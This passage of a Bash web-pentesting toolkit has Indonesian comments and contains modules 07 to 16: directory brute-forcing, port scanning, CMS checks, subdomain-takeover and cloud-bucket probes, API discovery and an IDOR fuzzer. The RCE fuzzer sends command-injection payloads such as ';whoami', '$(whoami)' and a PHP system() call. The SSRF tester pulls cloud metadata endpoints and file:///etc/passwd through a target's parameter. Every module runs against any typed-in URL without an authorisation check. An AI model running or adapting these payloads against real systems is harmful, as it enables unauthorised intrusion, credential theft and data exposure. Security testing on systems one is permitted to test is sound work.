function start_dir_bruter {
    clear
    local nama_modul="DIRECTORY BRUTER"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 07: DIRECTORY BRUTE-FORCER (TURBO MODE)${NC}                "
    echo -e "${C}=============================================================================${NC}"

    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/): ${W}"
    read target
    [[ -z "$target" ]] && return
    [[ "${target: -1}" != "/" ]] && target="$target/"

    # --- LOGIKA PENAMAAN FILE AMAN ---
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_DIR_BRUTE.txt"

    # Wordlist diperluas
    wordlist=("admin" "login" "config" "api" "v1" "v2" "db" "backup" ".env" ".git" "phpmyadmin" "secret" "dev" "staging" "test" "upload" "uploads" "images" "assets" "js" "css")
    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    total=${#wordlist[@]}
    found_count=0
    current=1

    # --- PENGATURAN MULTI-THREADING (FIFO) ---
    local threads=5
    local temp_fifo="/tmp/$$.fifo"
    mkfifo "$temp_fifo"
    exec 3<>"$temp_fifo"
    rm "$temp_fifo"
    for ((i=0; i<threads; i++)); do echo >&3; done

    echo -e "\n${INFO} Memulai Turbo Scan (${C}Threads: $threads${NC}) pada: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    # Setup Log Header
    {
        echo "DIRECTORY BRUTE-FORCE REPORT - $target"
        echo "DATE: $(date)"
        echo "---------------------------------------------------------------------------"
        printf "%-25s | %-12s | %-20s\n" "PATH TESTED" "HTTP CODE" "STATUS"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    # --- SCANNING LOOP ---
    for path in "${wordlist[@]}"; do
        read -u3 
        (
            # Visual Progress Bar (Sama seperti Modul 06)
            percent=$(( current * 100 / total ))
            bar_len=$(( percent / 5 ))
            bar=$(printf "%${bar_len}s" | tr ' ' '=')
            printf "\r${INFO} Progress: [${C}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

            # Requesting
            status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" --connect-timeout 10 "$target$path")

            if [[ "$status_code" != "404" && "$status_code" != "000" ]]; then
                local res_status="UNKNOWN"
                local color="${W}"
                
                case $status_code in
                    200) res_status="DITEMUKAN (OK)"; color="${G}${BOLD}" ;;
                    403) res_status="FORBIDDEN (403)"; color="${Y}" ;;
                    301|302) res_status="REDIRECT"; color="${B}" ;;
                    500) res_status="SERVER ERROR"; color="${R}" ;;
                esac

                # Output Detail ala Modul 06
                echo -e "\n  ${OK} ${G}ACTIVE PATH:${NC} ${W}/$path${NC}"
                echo -e "      ╰─> Status: ${color}$status_code $res_status${NC}"
                
                printf "%-25s | %-12s | %-20s\n" "/$path" "$status_code" "$res_status" >> "$filename"
                # Increment found count (dalam subshell ini tidak akan update variabel parent, 
                # namun untuk log tetap masuk)
            fi
            echo >&3 
        ) &
        ((current++))
    done

    wait 
    exec 3>&- 

    # --- FINAL REPORT ---
    echo -ne "\r                                                                                                    \r"
    echo -e "-----------------------------------------------------------------------------"
    echo -e "${OK} ${G}${BOLD}SCAN SELESAI!${NC} Hasil tersimpan di: ${DG}$filename"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_port_scanner {
    clear
    local nama_modul="PORT SCANNER"
    
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 08: PORT SCANNER & SERVICE DISCOVERY                  "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Memeriksa pintu masuk (port) yang terbuka dan layanan yang berjalan."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan IP atau Domain Target: ${W}"
    read target

    if [[ -z "$target" ]]; then
        echo -e "${ERR} Target tidak boleh kosong!"; return
    fi

    # Format Nama File Log Aman
    local target_clean=$(echo "$target" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${target_clean^^}_PORT_SCAN.txt"

    ports=(21 22 23 25 53 80 110 143 443 445 1433 1521 3306 3389 5432 8080 8443)

    echo -e "\n${INFO} Memulai pemindaian pada: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "====================================================="
        echo "          PORT SCANNING & SERVICE REPORT             "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-10s | %-15s | %-20s\n" "PORT" "STATUS" "SERVICE"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_ports=0
    for port in "${ports[@]}"; do
        echo -ne "  ${INFO} Checking Port: ${C}$port ${NC}\r"

        # Cek Koneksi TCP menggunakan Bash built-in
        (timeout 1 bash -c "echo > /dev/tcp/$target/$port") >/dev/null 2>&1
        result=$?

        if [ $result -eq 0 ]; then
            case $port in
                21) service="FTP" ;;
                22) service="SSH" ;;
                25) service="SMTP" ;;
                53) service="DNS" ;;
                80) service="HTTP" ;;
                443) service="HTTPS" ;;
                445) service="SMB (Windows)" ;;
                3306) service="MySQL/MariaDB" ;;
                3389) service="Remote Desktop" ;;
                8080|8443) service="Web Alternative" ;;
                *) service="Unknown" ;;
            esac
            
            res_status="OPEN"
            echo -e "  ${OK} Port ${W}$port ${NC}-> ${G}${BOLD}$res_status${NC} ${DG}($service)${NC}"
            ((found_ports++))
        else
            res_status="CLOSED/FILTERED"
            service="-"
        fi

        # Tulis ke tabel log hanya jika OPEN agar log ringkas
        if [[ "$res_status" == "OPEN" ]]; then
            printf "%-10s | %-15s | %-20s\n" "$port" "$res_status" "$service" >> "$filename"
        fi
    done

    echo -ne "                                                                                \r"
    echo -e "\n-----------------------------------------------------------------------------"
    
    if [ $found_ports -gt 0 ]; then
        echo -e "${OK} ${G}${BOLD}Scan Selesai! $found_ports port aktif ditemukan.${NC}"
        echo "KESIMPULAN: DITEMUKAN $found_ports PORT TERBUKA" >> "$filename"
    else
        echo -e "${ERR} ${R}Scan Selesai. Tidak ada port umum yang terbuka.${NC}"
        echo "KESIMPULAN: TIDAK ADA PORT UMUM YANG TERDETEKSI" >> "$filename"
    fi
    
    echo -e "\n${INFO} Laporan audit tersimpan di: ${DG}$filename"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_cms_scanner {
    clear
    local nama_modul="CMS SCANNER"
    
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 09: CMS IDENTIFIER & VULN CHECKER                     "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Mengidentifikasi CMS dan mencari kelemahan konfigurasi umum."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL Target (contoh: http://site.com/): ${W}"
    read target

    if [[ -z "$target" ]]; then
        echo -e "${ERR} URL tidak boleh kosong!"; return
    fi

    [[ "${target: -1}" != "/" ]] && target="$target/"

    # --- LOGIKA PENAMAAN FILE AMAN ---
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_CMS_AUDIT.txt"

    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    
    echo -e "\n${INFO} Menganalisis target: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Log
    {
        echo "====================================================="
        echo "          CMS IDENTIFICATION & AUDIT REPORT          "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-30s | %-20s\n" "COMPONENTS / PATH" "STATUS / FINDING"
        echo "-----------------------------------------------------"
    } > "$filename"

    # 1. Identifikasi CMS Dasar
    page_source=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target")
    
    cms_found="Unknown"
    [[ "$page_source" == *"wp-content"* ]] && cms_found="WordPress"
    [[ "$page_source" == *"joomla"* ]] && cms_found="Joomla"
    [[ "$page_source" == *"Drupal"* ]] && cms_found="Drupal"
    [[ "$page_source" == *"Laravel"* ]] && cms_found="Laravel (Framework)"

    echo -e "  ${OK} Identifikasi CMS: ${G}${BOLD}$cms_found${NC}"
    printf "%-30s | %-20s\n" "CMS Core" "$cms_found" >> "$filename"

    # 2. Cek Kerentanan Spesifik (WordPress sebagai contoh utama)
    findings=0
    if [[ "$cms_found" == "WordPress" ]]; then
        # Cek XML-RPC
        xml_check=$(curl -s -o /dev/null -w "%{http_code}" -k "$target/xmlrpc.php")
        if [[ "$xml_check" == "200" || "$xml_check" == "405" ]]; then
            echo -e "  ${ERR} ${Y}Vulnerability:${NC} XML-RPC Aktif (Potensi Brute Force/DoS)"
            printf "%-30s | %-20s\n" "/xmlrpc.php" "ENABLED (VULN)" >> "$filename"
            ((findings++))
        fi

        # Cek Directory Listing Uploads
        up_check=$(curl -s -k "$target/wp-content/uploads/" | grep -i "Index of")
        if [[ -n "$up_check" ]]; then
            echo -e "  ${ERR} ${Y}Vulnerability:${NC} Directory Listing di Uploads Terbuka"
            printf "%-30s | %-20s\n" "/wp-content/uploads/" "OPEN (SENSITIVE)" >> "$filename"
            ((findings++))
        fi
    fi

    if [ $findings -eq 0 ]; then
        echo -e "  ${OK} Tidak ditemukan miskonfigurasi CMS standar."
        printf "%-30s | %-20s\n" "Security Patches" "SEEMS SECURE" >> "$filename"
    fi

    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    echo "KESIMPULAN: AUDIT CMS SELESAI" >> "$filename"
    
    echo -e "${INFO} Laporan audit CMS tersimpan di: ${DG}$filename"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_rce_scanner {
    clear
    local nama_modul="RCE SCANNER"
    
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 10: REMOTE CODE EXECUTION (RCE) SCANNER               "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Mencoba eksekusi perintah OS (Linux/Windows) via parameter URL."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL Full (contoh: http://site.com/ping.php?host=): ${W}"
    read target

    if [[ -z "$target" ]]; then
        echo -e "${ERR} URL tidak boleh kosong!"; return
    fi

    # --- LOGIKA PENAMAAN FILE AMAN ---
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_RCE_AUDIT.txt"

    # Payload RCE Teroptimasi
    rce_payloads=(
        ";whoami" "|whoami" "&whoami" "\`whoami\`" "\$(whoami)"
        ";id" "|id" "&id" ";ls -la" "<?php system('whoami'); ?>"
    )

    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"

    echo -e "\n${INFO} Memulai Fuzzing RCE pada: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    # Inisialisasi Header Tabel di Log
    {
        echo "====================================================="
        echo "          REMOTE CODE EXECUTION AUDIT REPORT         "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-25s | %-12s | %-20s\n" "PAYLOAD" "STATUS" "SERVER RESP"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_rce=0
    for payload in "${rce_payloads[@]}"; do
        echo -ne "  ${INFO} Testing: ${C}$payload ${NC}\r"
        
        # URL Encode payload menggunakan python3
        encoded_payload=$(echo -ne "$payload" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null || echo "$payload")
        
        # Kirim request dengan timeout agar tidak hang
        response=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$target$encoded_payload")

        # Cek indikator keberhasilan (mencari string sistem Linux/Unix)
        if echo "$response" | grep -qiE "uid=|gid=|groups=|www-data|apache|nginx|root|system32|Windows IP Configuration"; then
            res_status="VULNERABLE"
            # Ambil potongan respon untuk bukti (evidence)
            server_resp=$(echo "$response" | grep -iE "uid=|www-data|root|Windows" | head -n 1 | cut -c1-30 | tr -d '\n\r')
            
            echo -e "  ${OK} ${R}${BLINK}RCE DETECTED!${NC} -> Payload: ${W}$payload${NC}"
            echo -e "        Response: ${G}$server_resp${NC}"
            ((found_rce++))
            
            printf "%-25s | %-12s | %-20s\n" "$payload" "$res_status" "$server_resp" >> "$filename"
            # Jangan 'break' agar kita tahu payload mana saja yang berhasil
        else
            res_status="SECURE"
            server_resp="-"
            printf "%-25s | %-12s | %-20s\n" "$payload" "$res_status" "$server_resp" >> "$filename"
        fi

        sleep 0.2
    done

    # Bersihkan baris progress
    echo -ne "                                                                                \r"
    echo -e "-----------------------------------------------------------------------------"
    
    if [ $found_rce -gt 0 ]; then
        echo -e "${ERR} ${R}${BOLD}[!] ALERT: Server Terbuka! Kendali penuh didapatkan.${NC}"
        echo "KESIMPULAN: CRITICAL VULNERABILITY FOUND (RCE)" >> "$filename"
    else
        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan eksekusi perintah langsung.${NC}"
        echo "KESIMPULAN: NO DIRECT RCE DETECTED" >> "$filename"
    fi
    
    echo -e "\n${INFO} Hasil audit RCE tersimpan di: ${DG}$filename"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_ssrf_tester {
    clear
    local nama_modul="SSRF SCANNER"
    
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 11: SERVER-SIDE REQUEST FORGERY (SSRF)               "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Memaksa server mengakses jaringan internal atau metadata cloud."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL Parameter (contoh: http://site.com/proxy.php?url=): ${W}"
    read target

    if [[ -z "$target" ]]; then
        echo -e "${ERR} URL tidak boleh kosong!"; return
    fi

    # --- LOGIKA PENAMAAN FILE AMAN ---
    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_SSRF_AUDIT.txt"

    # Payload SSRF Teroptimasi (Cloud & Local)
    ssrf_payloads=(
        "http://169.254.169.254/latest/meta-data/"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://127.0.0.1:22"
        "http://127.0.0.1:3306"
        "file:///etc/passwd"
        "http://localhost:80"
    )

    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    echo -e "\n${INFO} Memulai Penetrasi SSRF pada: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "          SSRF VULNERABILITY AUDIT REPORT            "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-40s | %-15s\n" "INTERNAL RESOURCE TESTED" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_ssrf=0
    for payload in "${ssrf_payloads[@]}"; do
        echo -ne "  ${INFO} Testing: ${C}$payload ${NC}\r"
        
        # Kirim request dengan timeout ketat
        response=$(curl -s -k -L -A "$ua" --connect-timeout 5 "$target$payload")

        # Indikator SSRF Berhasil (Pattern Matching)
        if [[ "$response" == *"ami-id"* || "$response" == *"root:x:"* || "$response" == *"SSH-2.0"* || "$response" == *"computeMetadata"* || "$response" == *"mysql_native_password"* ]]; then
            res_status="VULNERABLE"
            echo -e "  ${OK} ${R}${BLINK}SSRF FOUND:${NC} ${W}$payload${NC}"
            ((found_ssrf++))
            printf "%-40s | %-15s\n" "$payload" "$res_status" >> "$filename"
        else
            res_status="SECURE/TIMEOUT"
            printf "%-40s | %-15s\n" "$payload" "$res_status" >> "$filename"
        fi
        sleep 0.1
    done

    echo -ne "                                                                                \r"
    echo -e "-----------------------------------------------------------------------------"
    
    if [ $found_ssrf -gt 0 ]; then
        echo -e "${ERR} ${R}${BOLD}[!] ALERT: Server rentan SSRF! Akses internal terdeteksi.${NC}"
        echo "KESIMPULAN: CRITICAL VULNERABILITY (SSRF)" >> "$filename"
    else
        echo -e "${OK} ${G}Scan Selesai. Tidak ditemukan kebocoran data internal.${NC}"
        echo "KESIMPULAN: NO SSRF LEAKAGE DETECTED" >> "$filename"
    fi
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_cors_scanner {
    clear
    local nama_modul="CORS SCANNER"
    
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 12: CORS MISCONFIGURATION SCANNER                     "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Menguji kebijakan Cross-Origin (Pencurian Session via AJAX)."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL API/Web Target: ${W}"
    read target

    if [[ -z "$target" ]]; then
        echo -e "${ERR} URL tidak boleh kosong!"; return
    fi

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_CORS_AUDIT.txt"

    attacker_origin="http://evil-attacker.com"
    ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    echo -e "\n${INFO} Memeriksa Header CORS pada: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "          CORS MISCONFIGURATION AUDIT REPORT         "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-35s | %-25s\n" "CORS HEADER" "VALUE/RESULT"
        echo "-----------------------------------------------------"
    } > "$filename"

    # Request dengan Header Origin kustom
    cors_res=$(curl -s -I -k -A "$ua" -H "Origin: $attacker_origin" --connect-timeout 10 "$target")

    allow_origin=$(echo "$cors_res" | grep -i "Access-Control-Allow-Origin" | awk '{print $2}' | tr -d '\r')
    allow_creds=$(echo "$cors_res" | grep -i "Access-Control-Allow-Credentials" | awk '{print $2}' | tr -d '\r')

    # Evaluasi Hasil
    status_final="SECURE"
    color_res="${G}"

    if [[ "$allow_origin" == "$attacker_origin" ]]; then
        status_final="VULNERABLE (REFLECTED)"
        color_res="${Y}"
        if [[ "$allow_creds" == *"true"* ]]; then
            status_final="CRITICAL (REFLECTED + CREDS)"
            color_res="${R}${BLINK}"
        fi
    elif [[ "$allow_origin" == "*" ]]; then
        status_final="RISKY (WILDCARD)"
        color_res="${Y}"
    fi

    echo -e "  ${OK} ACAO Header: ${W}${allow_origin:-NOT FOUND}${NC}"
    echo -e "  ${OK} ACAC Header: ${W}${allow_creds:-NOT FOUND}${NC}"
    echo -e "  ${OK} Status Audit: ${color_res}$status_final${NC}"

    # Tulis ke Log
    printf "%-35s | %-25s\n" "Access-Control-Allow-Origin" "${allow_origin:-None}" >> "$filename"
    printf "%-35s | %-25s\n" "Access-Control-Allow-Credentials" "${allow_creds:-None}" >> "$filename"
    printf "%-35s | %-25s\n" "OVERALL STATUS" "$status_final" >> "$filename"

    echo "-----------------------------------------------------" >> "$filename"
    echo -e "\n${INFO} Hasil audit CORS tersimpan di: ${DG}$filename"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_takeover_hunter {
    clear
    local nama_modul="TAKEOVER HUNTER"
    
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 13: SUBDOMAIN TAKEOVER HUNTER                         "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Menganalisis CNAME Record yang mengarah ke layanan pihak ketiga mati."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan Subdomain Target (contoh: dev.site.com): ${W}"
    read target

    if [[ -z "$target" ]]; then
        echo -e "${ERR} Target tidak boleh kosong!"; return
    fi

    local target_clean=$(echo "$target" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${target_clean^^}_TAKEOVER_AUDIT.txt"

    echo -e "\n${INFO} Menganalisis DNS Record untuk: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "          SUBDOMAIN TAKEOVER AUDIT REPORT            "
        echo "====================================================="
        echo "TARGET : $target"
        echo "DATE   : $(date)"
        echo "-----------------------------------------------------"
        printf "%-20s | %-35s\n" "DNS TYPE" "VALUE / ALIAS"
        echo "-----------------------------------------------------"
    } > "$filename"

    # Ambil CNAME menggunakan host
    cname=$(host -t CNAME "$target" | awk '/is an alias for/ {print $NF}' | sed 's/\.$//')

    if [[ -z "$cname" ]]; then
        echo -e "  ${OK} Status: ${G}AMAN${NC} (Tidak ditemukan CNAME record)."
        printf "%-20s | %-35s\n" "CNAME" "NOT FOUND" >> "$filename"
    else
        echo -e "  ${OK} CNAME Terdeteksi: ${Y}$cname${NC}"
        printf "%-20s | %-35s\n" "CNAME" "$cname" >> "$filename"
        
        # Database Fingerprint Layanan Rentan
        fingerprints=(
            "GitHub Pages|github.io"
            "Heroku|herokudns.com"
            "Amazon S3|amazonaws.com"
            "Shopify|myshopify.com"
            "Squarespace|squarespace.com"
            "Azure|azurewebsites.net"
        )

        found_match=false
        for entry in "${fingerprints[@]}"; do
            service=$(echo $entry | cut -d'|' -f1)
            pattern=$(echo $entry | cut -d'|' -f2)

            if [[ "$cname" == *"$pattern"* ]]; then
                echo -e "  ${ERR} ${R}${BLINK}POTENSI TAKEOVER:${NC} Mengarah ke ${W}$service${NC}"
                echo "-----------------------------------------------------" >> "$filename"
                echo "STATUS: VULNERABLE TO TAKEOVER ($service)" >> "$filename"
                found_match=true
                break
            fi
        done

        if [ "$found_match" = false ]; then
            echo -e "  ${INFO} Status: ${C}CNAME UNKNOWN${NC} (Bukan fingerprint umum)."
        fi
    fi

    echo -e "\n-----------------------------------------------------------------------------"
    echo -e "${INFO} Laporan audit DNS tersimpan di: ${DG}$filename"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_bucket_hunter {
    clear
    local nama_modul="BUCKET HUNTER"
    
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 14: CLOUD BUCKET (S3/GCP) EXPOSURE FINDER             "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Mencari storage AWS S3 atau Google Cloud yang terbuka secara publik."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan Nama Bucket/Projek: ${W}"
    read bucket_name

    if [[ -z "$bucket_name" ]]; then
        echo -e "${ERR} Nama bucket tidak boleh kosong!"; return
    fi

    local filename="${bucket_name^^}_BUCKET_AUDIT.txt"

    echo -e "\n${INFO} Memulai imbasan pada: ${W}$bucket_name"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "          CLOUD BUCKET EXPOSURE REPORT               "
        echo "====================================================="
        echo "BUCKET NAME : $bucket_name"
        echo "DATE        : $(date)"
        echo "-----------------------------------------------------"
        printf "%-15s | %-12s | %-20s\n" "CLOUD PROVIDER" "HTTP CODE" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    # --- 1. AWS S3 ---
    s3_url="http://$bucket_name.s3.amazonaws.com"
    s3_res=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$s3_url")
    
    if [[ "$s3_res" == "200" ]]; then
        s3_stat="VULNERABLE (OPEN)"
        echo -e "  ${ERR} AWS S3  : ${R}${BOLD}OPEN / EXPOSED${NC}"
    elif [[ "$s3_res" == "403" ]]; then
        s3_stat="SECURE (PRIVATE)"
        echo -e "  ${OK} AWS S3  : ${G}PRIVATE${NC}"
    else
        s3_stat="NOT FOUND"
        echo -e "  ${INFO} AWS S3  : ${DG}NOT FOUND ($s3_res)${NC}"
    fi
    printf "%-15s | %-12s | %-20s\n" "Amazon S3" "$s3_res" "$s3_stat" >> "$filename"

    # --- 2. GCP ---
    gcp_url="https://storage.googleapis.com/$bucket_name"
    gcp_res=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$gcp_url")

    if [[ "$gcp_res" == "200" ]]; then
        gcp_stat="VULNERABLE (OPEN)"
        echo -e "  ${ERR} GCP     : ${R}${BOLD}OPEN / EXPOSED${NC}"
    elif [[ "$gcp_res" == "403" ]]; then
        gcp_stat="SECURE (PRIVATE)"
        echo -e "  ${OK} GCP     : ${G}PRIVATE${NC}"
    else
        gcp_stat="NOT FOUND"
        echo -e "  ${INFO} GCP     : ${DG}NOT FOUND ($gcp_res)${NC}"
    fi
    printf "%-15s | %-12s | %-20s\n" "Google GCP" "$gcp_res" "$gcp_stat" >> "$filename"

    echo -e "\n-----------------------------------------------------------------------------"
    echo "-----------------------------------------------------" >> "$filename"
    echo -e "${OK} Hasil audit bucket tersimpan di: ${DG}$filename"
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_api_discovery {
    clear
    local nama_modul="API DISCOVERY"
    
    echo -e "${C}============================================================================="
    echo -e "                  MODUL 15: API ENDPOINT DISCOVERY (REST/GRAPHQL)            "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Mencari jalur API tersembunyi, dokumentasi Swagger, atau GraphQL."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL Target (contoh: http://api.site.com/): ${W}"
    read target
    [[ "${target: -1}" != "/" ]] && target="$target/"

    if [[ -z "$target" ]]; then
        echo -e "${ERR} URL tidak boleh kosong!"; return
    fi

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_API_DISCOVERY.txt"

    api_paths=("api/v1" "api/v2" "graphql" "swagger-ui.html" "api-docs" "v1/swagger.json" "api/v1/user" "api/v1/auth" "api/v1/console" "graphiql")

    echo -e "\n${INFO} Memindai API pada: ${W}$target"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
        echo "          API ENDPOINT DISCOVERY REPORT              "
        echo "====================================================="
        echo "TARGET : $target"
        printf "%-25s | %-12s | %-20s\n" "ENDPOINT PATH" "HTTP CODE" "STATUS"
        echo "-----------------------------------------------------"
    } > "$filename"

    found_api=0
    for path in "${api_paths[@]}"; do
        echo -ne "  ${INFO} Scanning: ${C}/$path ${NC}\r"
        status_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" --connect-timeout 5 "$target$path")

        if [[ "$status_code" == "200" || "$status_code" == "401" || "$status_code" == "403" ]]; then
            res_status="FOUND"
            color_api="${G}"
            [[ "$status_code" == "401" ]] && { res_status="AUTH REQUIRED"; color_api="${Y}"; }
            [[ "$status_code" == "403" ]] && { res_status="FORBIDDEN"; color_api="${Y}"; }
            
            echo -e "  ${OK} ${W}/$path ${NC}-> ${color_api}$status_code${NC} (${DG}$res_status${NC})"
            printf "%-25s | %-12s | %-20s\n" "/$path" "$status_code" "$res_status" >> "$filename"
            ((found_api++))
        fi
        sleep 0.05
    done

    echo -ne "                                                                                \r"
    echo "-----------------------------------------------------" >> "$filename"
    echo -e "${OK} Scan selesai. Ditemukan ${G}$found_api${NC} endpoint potensial."
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke menu...${NC}"
    read
}
function start_idor_tester {
    clear
    local nama_modul="IDOR TESTER"
    
    echo -e "${C}============================================================================="
    echo -e "              MODUL 16: BROKEN ACCESS CONTROL (IDOR) - TURBO                 "
    echo -e "=============================================================================${NC}"

    echo -ne "${Q} Masukkan URL dengan ID (contoh: http://site.com/api/user?id=100): ${W}"
    read target

    if [[ -z "$target" || "$target" != *"="* ]]; then
        echo -e "${ERR} URL harus menyertakan parameter ID!"; return
    fi

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_IDOR_AUDIT.txt"
    
    base_url="${target%=*}="
    original_id="${target#*=}"

    echo -e "${INFO} Mengambil baseline respon untuk ID asli (${C}$original_id${NC})..."
    baseline_res=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -k "$target")
    baseline_size=$(echo $baseline_res | cut -d':' -f2)
    echo -e "${INFO} Baseline Size: ${W}$baseline_size bytes${NC}"

    # --- PENGATURAN MULTI-THREADING ---
    local threads=10
    local temp_fifo="/tmp/idor_$$.fifo"
    mkfifo "$temp_fifo"
    exec 4<>"$temp_fifo"
    rm "$temp_fifo"
    for ((i=0; i<threads; i++)); do echo >&4; done

    echo -e "\n${INFO} Memulai Fuzzing ID (Range: -20 s/d +50)..."
    echo "-----------------------------------------------------------------------------"

    {
        echo "====================================================="
